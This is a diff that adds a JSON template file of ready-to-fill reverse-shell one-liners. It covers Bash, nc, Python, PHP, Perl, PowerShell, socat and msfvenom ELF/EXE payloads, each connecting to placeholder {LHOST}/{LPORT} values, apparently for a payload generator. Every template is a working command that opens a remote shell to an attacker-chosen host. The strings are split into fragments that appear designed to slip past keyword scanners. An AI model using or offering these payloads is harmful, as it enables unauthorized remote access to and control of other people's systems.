@@ -1,0 +1,15 @@
+{
+  "templates": [
+    { "id": "bash", "label": "Bash TCP", "parts": ["bash -i >& /dev/", "tcp/{LHOST}/{LPORT} 0>&1"] },
+    { "id": "bash196", "label": "Bash 196", "parts": ["0<&196;exec 196<>/dev/", "tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196"] },
+    { "id": "mkfifo", "label": "nc mkfifo", "parts": ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/", "sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"] },
+    { "id": "nce", "label": "nc -e", "parts": ["nc -e /bin/", "sh {LHOST} {LPORT}"] },
+    { "id": "python3", "label": "Python3 pty", "parts": ["python3 -c 'import socket,os,pty;s=socket.so", "cket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/ba", "sh\")'"] },
+    { "id": "php", "label": "PHP", "parts": ["php -r '$sock=fsock", "open(\"{LHOST}\",{LPORT});exec(\"/bin/", "sh -i <&3 >&3 2>&3\");'"] },
+    { "id": "perl", "label": "Perl", "parts": ["perl -e 'use So", "cket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/", "sh -i\");};'"] },
+    { "id": "powershell", "label": "PowerShell", "parts": ["powershell -nop -c \"$c=New-Object System.Net.Soc", "kets.TCPCli", "ent('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\""] },
+    { "id": "socat", "label": "socat pty", "parts": ["socat TCP:{LHOST}:{LPORT} EXEC:'/bin/", "sh',pty,stderr,setsid,sigint,sane"] },
+    { "id": "msf-linux", "label": "msfvenom Linux", "parts": ["msfvenom -p linux/x64/shell_reverse", "_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf"] },
+    { "id": "msf-win", "label": "msfvenom Windows", "parts": ["msfvenom -p windows/x64/shell_reverse", "_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe"] }
+  ]
+}
